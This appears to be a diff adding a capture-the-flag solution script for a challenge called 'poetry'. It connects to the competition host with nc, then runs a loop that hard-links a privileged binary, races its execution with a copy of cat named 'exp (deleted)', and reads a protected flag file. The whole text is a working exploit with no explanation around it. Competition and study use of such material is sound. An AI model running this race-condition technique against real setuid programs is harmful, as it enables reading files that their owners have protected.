@@ -1,0 +1,6 @@
+nc poetry.ctfcompetition.com 1337
+
+cd /home/user
+cp /bin/cat 'exp (deleted)'
+while true; do ln /home/poetry/poetry ./exp; (./exp ../poetry/flag &); rm exp; done
+
